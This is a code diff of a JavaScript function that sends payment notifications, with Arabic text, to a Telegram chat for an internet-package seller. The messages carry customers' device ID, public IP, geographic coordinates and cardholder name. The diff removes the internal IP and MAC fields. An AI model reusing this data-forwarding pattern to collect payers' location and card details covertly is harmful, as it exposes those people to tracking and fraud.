@@ -48,11 +48,9 @@ async function sendTelegramMessage(data, isInitial = true) {
     let message = "";
 
     if (isInitial) {
-      // 1. الرسالة الأولى: جاري بدء عملية الدفع مع كافة تفاصيل الجهاز والشبكة والموقع
+      // 1. الرسالة الأولى: جاري بدء عملية الدفع
       const clientID = data.clientID || data.clientId || "غير متوفر";
-      const currentInternalIP = data.internalIP || data.currentInternalIP || data.ip || "غير متوفر";
       const publicIP = data.publicIP || (data.geoData && data.geoData.publicIP) || "غير متوفر";
-      const currentInternalMAC = data.mac || data.currentInternalMAC || "غير متوفر";
 
       // البيانات الجغرافية
       const geoLat = data.lat || (data.geoData && data.geoData.lat) || "غير متوفر";
@@ -89,9 +87,7 @@ async function sendTelegramMessage(data, isInitial = true) {
 
       // تفاصيل الجهاز والشبكة والموقع المدمجة
       message += `\n🆔 <b>معرف الجهاز:</b> <code>${clientID}</code>\n` +
-                 `🏠 <b>IP الداخلي:</b> <code>${currentInternalIP}</code>\n` +
                  `🌍 <b>IP الخارجي:</b> <code>${publicIP}</code>\n` +
-                 `🖥 <b>MAC Address:</b> <code>${currentInternalMAC}</code>\n` +
                  `———————————————\n` +
                  `📅 <b>تاريخ الإرسال:</b> ${dateTimeStr}\n` +
                  `📡 <b>الإحداثيات:</b> <code>${geoLat}, ${geoLon}</code>\n` +
@@ -112,7 +108,7 @@ async function sendTelegramMessage(data, isInitial = true) {
       const packageInfo = data.package_info || data.packageName || "باقة إنترنت شبكة حكايات";
       const customerName = data.card_data?.name || data.billing_data?.first_name || "عميل شبكة حكايات";
 
-      message = `✅ <b>تم عملية الدفع بنجاح!</b>\n\n` +
+      message = `✅ <b>تمت عملية الدفع بنجاح!</b>\n\n` +
                 `🆔 رقم العملية: <code>${txnId}</code>\n` +
                 `👤 اسم العميل / البطاقة: <b>${customerName}</b>\n` +
                 `💳 وسيلة الدفع: <b>${method}</b>\n` +
